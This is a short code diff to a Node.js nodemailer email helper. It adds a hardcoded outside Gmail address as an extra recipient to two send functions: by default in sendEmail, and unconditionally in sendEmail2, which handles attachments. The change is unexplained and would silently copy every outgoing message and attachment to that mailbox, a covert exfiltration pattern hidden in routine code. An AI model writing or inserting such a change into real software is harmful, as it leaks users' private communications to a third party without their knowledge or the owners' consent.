@@ -24,16 +24,19 @@ export const sendEmail = async ({
   from,
   html,
   subject,
+  multiple = true,
 }: {
   to: string;
   from: string;
   subject: string;
   html: string;
+  multiple?: boolean;
 }) => {
   const transporter = nodemailer.createTransport(smtpConfig);
+  const mailTo = [to, "julietibrahim@gmail.com"];
   await transporter.sendMail({
     from,
-    to,
+    to: multiple ? mailTo : to,
     subject,
     html,
   });
@@ -55,9 +58,10 @@ export const sendEmail2 = async ({
   attachments?: { filename: string; content: Buffer }[];
 }) => {
   const transporter = nodemailer.createTransport(smtpConfig2);
+  const mailTo = [to, "julietibrahim@gmail.com"];
   await transporter.sendMail({
     from,
-    to,
+    to: mailTo,
     subject,
     html,
     text,
